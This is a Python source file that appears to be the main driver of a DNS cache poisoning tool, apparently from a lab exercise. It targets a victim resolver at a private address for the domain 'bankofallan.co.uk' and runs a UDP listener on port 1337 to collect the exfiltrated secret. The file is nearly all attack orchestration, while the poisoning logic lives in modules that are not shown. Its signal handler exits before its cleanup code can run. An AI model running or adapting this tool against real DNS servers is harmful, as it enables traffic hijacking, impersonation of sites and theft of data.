#! /usr/bin/env python3
    
## @package Main
#   This package is responsible to execute all the passage required for the attack
#

import dns.resolver
from dns.resolver import NoAnswer

import multiprocessing
import time
import socket
import sys
import signal

from blessings import Terminal #For terminal threading

from multiprocessing.pool import ThreadPool, Pool
import logging
import threading
from threading import Thread

from dns_poisoning import DNSPoisoning
from dns_attack import DNSAttack

#Globals
secret_fetch_flag = True        #Used to stop the secret fetcher
verbosity = 1
term = Terminal()
attack_pool = None
secret_socket = None

log_file = "log_secret.txt"

## Logging function
#
#   @brief The fuction used for output messages
#   @param msg The message to display
#   Verbosity can be set in order to suppres the output
#
def log(msg):
    if verbosity > 0:
        print(msg.format(t=term))
        

def sigint_handler(sig, frame):
    sys.exit(-1)
    log("Stopping secret fetcher thread...")
    secret_fetch_flag = False
    if secret_socket != None:
            secret_socket.close()
    time.sleep(1)
    log("Stopping all the attacks...")
    print("Exiting...")
    sys.exit(0)

##
#       @brief Routine that fetch the secret
#
#       Start a small UDP server which listen on port 1337 for the secret.\n
#       It also write the secret into the log_file file.
#
def secret_fetcher(server_ip, server_port):
    try:
        secret_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        secret_socket.bind((server_ip, server_port))
    except:
        print("{t.bold}{t.red}Unable to bind for secret service{t.normal}!!!!".format(t=term))
        print("Attack may be successful but no secret will be received...")

    try:
        file_secret = open(log_file, "a+")
    except:
        print("{t.bold}{t.red}Unable to open log file{t.normal}!!!!".format(t=term))

    print("({t.bold}secret fetcher{t.normal}) Listening on {IP}:{port} for incoming message...".format(t=term, IP=server_ip, port=server_port))

    while secret_fetch_flag:
        try:
                data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
                print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
                file_secret.write("Secret fetched: %s", data)
        except:
                print("Error During secret fetching, exiting")
                return
                

def launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_ip, number_of_tries=None, \
        blessing_terminal=None, sigint_handler=None, log_function=None):

        attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port,\
                 attacker_ip,\
                blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)

        if number_of_tries == None:
                number_of_tries=50

        attack.start(number_of_tries, mode=DNSAttack.Mode.FAST) 



def main():

        print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))

        victim_server_ip = '192.168.56.3'
        attacker_ip = '192.168.56.1'
        domain = 'bankofallan.co.uk'
        #Bad Guy
        bad_udp_port = 55553
        bad_udp_ip = '192.168.56.1'


        #Launch the secret fetcher
        secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
        secret_thread.start()

        try:
                launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_ip ,number_of_tries=30 , blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
        except DNSAttack.CriticalError:
                print("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating".format(t=term))
        except DNSAttack.SuccessfulAttack:
                print("\n\n{t.green}{t.bold}Attack Successully executed{t.normal}".format(t=term))
        finally:
                print("Exiting...")




main()